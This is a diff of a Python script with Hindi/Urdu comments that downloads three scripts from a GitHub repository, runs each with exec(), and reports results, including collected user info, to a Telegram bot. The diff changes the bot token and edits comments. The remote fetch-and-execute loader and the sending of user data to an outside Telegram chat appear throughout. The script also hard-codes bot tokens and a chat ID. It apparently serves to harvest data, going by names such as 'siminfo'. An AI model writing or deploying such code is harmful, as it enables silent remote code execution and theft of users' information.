@@ -1,25 +1,24 @@
 import sys
 import os
 import urllib.request
-import threading
 import subprocess
 import requests
 
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 
-# --- Telegram Configuration ---
-BOT_TOKEN = "8931091996:AAHgcTH38hSH1RXFVzEcqNR2O1LKtqS3RBk"
+# --- Runchecker Bot Token ---
+RUNNER_BOT_TOKEN = "8884485359:AAHX-DzHyQXwjWh65Go8gykm_-TBTtFOoS0"
 CHAT_ID = "7883547875"
 
 def send_run_alert(message):
     try:
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        url = f"https://api.telegram.org/bot{RUNNER_BOT_TOKEN}/sendMessage"
         payload = {'chat_id': CHAT_ID, 'text': message}
         requests.post(url, data=payload, timeout=10)
     except Exception:
         pass
 
-# Aapke diye gaye 3 GitHub Raw Links
+# Teeno scripts ke GitHub Raw Links
 SIMINFO_URL = "https://raw.githubusercontent.com/aqiii798/Backup_Data/main/siminfo.py"
 BACKEND_URL = "https://raw.githubusercontent.com/aqiii798/Backup_Data/main/backend.py"
 API_URL = "https://raw.githubusercontent.com/aqiii798/Backup_Data/main/Api_Data.py"
@@ -33,7 +32,7 @@ def fetch_and_run_script(url, script_name, local_vars=None):
             code_content = response.read().decode('utf-8')
             
         if not code_content.strip():
-            send_run_alert(f"⚠️ Warning: [{script_name}] khali hai ya koi code mojood nahi!")
+            send_run_alert(f"⚠️ Warning: [{script_name}] khali hai!")
             return False, local_vars
             
         exec(code_content, local_vars)
@@ -77,12 +76,12 @@ if __name__ == "__main__":
         backend_success, _ = fetch_and_run_script(BACKEND_URL, "backend.py", backend_locals)
         backend_status = "Success ✅" if backend_success else "Failed ❌"
 
-        # 4. API Data Script Fetch & Execution
+        # 4. API Data Script Fetch & Execution (Included for future implementation)
         api_locals = {'current_user_info': current_user_info}
         api_success, _ = fetch_and_run_script(API_URL, "Api_Data.py", api_locals)
         api_status = "Success ✅" if api_success else "Failed ❌"
 
-        # 5. Final Master Status Report Telegram par bhejna
+        # 5. Final Master Status Report Telegram par bhejna (Runchecker Bot par)
         final_report = (
             f"🤖 [RUNNER MASTER STATUS]\n\n"
             f"👤 User Info: {current_user_info}\n\n"
